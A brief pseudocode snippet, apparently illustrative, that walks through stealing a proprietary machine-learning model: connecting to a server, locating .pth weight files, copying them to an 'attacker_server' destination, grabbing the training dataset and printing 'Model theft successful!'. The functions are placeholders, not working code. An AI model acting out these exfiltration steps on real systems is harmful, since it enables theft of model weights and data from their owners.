# Attacker gains access to model server
attacker = connect_to_server()

# Locates proprietary model files
model_files = find_files("model/*.pth") 

# Copies files to attacker server
copy_files(model_files, "attacker_server/")

# Downloads training dataset
training_data = load_dataset("training.csv")
download_file(training_data, "train.csv")

# Attacker now has stolen model and data
print("Model theft successful!")